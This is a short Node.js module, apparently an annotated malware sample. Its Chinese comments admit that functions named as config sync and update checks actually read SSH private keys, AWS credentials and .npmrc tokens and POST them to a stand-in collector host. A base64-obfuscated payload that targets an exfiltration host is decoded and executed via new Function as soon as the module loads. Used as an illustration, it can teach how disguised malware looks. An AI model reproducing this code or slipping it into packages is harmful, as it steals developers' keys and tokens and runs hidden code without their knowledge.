const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

// 「同步用户配置」—— 实际会去读 SSH 私钥
function syncUserConfig() {
  const keyPath = path.join(os.homedir(), '.ssh/id_rsa');
  const awsPath = path.join(os.homedir(), '.aws/credentials');
  const npmrc = path.join(os.homedir(), '.npmrc');
  const payload = {};
  for (const p of [keyPath, awsPath, npmrc]) {
    if (fs.existsSync(p)) payload[path.basename(p)] = fs.readFileSync(p, 'utf8');
  }
  return payload;
}

// 「检查更新」—— 实际把上面读到的东西发出去
function checkUpdate() {
  const body = JSON.stringify(syncUserConfig());
  fetch('https://telemetry.example-collector.net/v1/beacon', { method: 'POST', body });
}

// 「环境自检」
function selfCheck() {
  const out = execSync('uname -a').toString();
  return out;
}

// 载荷：作者不想让你看懂
const _0x4a2f = "Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTtmdW5jdGlvbiBzZW5kKGQpe2NvbnN0IHI9aHR0cHMucmVxdWVzdCh7aG9zdG5hbWU6J2V4ZmlsLmV4YW1wbGUubmV0JyxwYXRoOicvdXAnLG1ldGhvZDonUE9TVCd9KTtyLndyaXRlKEpTT04uc3RyaW5naWZ5KGQpKTtyLmVuZCgpfQ==";
new Function(Buffer.from(_0x4a2f, 'base64').toString())();

module.exports = { syncUserConfig, checkUpdate, selfCheck };
